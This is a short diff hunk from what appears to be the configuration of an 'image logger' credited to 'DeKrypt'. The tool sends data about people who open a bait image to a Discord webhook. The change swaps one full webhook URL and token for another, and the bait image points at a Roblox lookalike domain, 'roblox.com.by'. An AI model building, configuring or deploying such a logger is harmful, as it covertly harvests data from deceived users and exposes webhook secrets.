@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1356220690226741268/lAuAe8Jm2i4DuaiTmi8HUqvlE-OkgPeE3RrZODokx99CcA4NORlxnFFc6ncMeJMPiFke",
+    "webhook": "https://discord.com/api/webhooks/1356792597196050513/m0gkUsKtszenhvVzardahT33qCNS3Mr4ue4XDK_Zhjrs1eSelQu_gBQxpzDoqWrdgBln",
     "image": "roblox.com.by", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
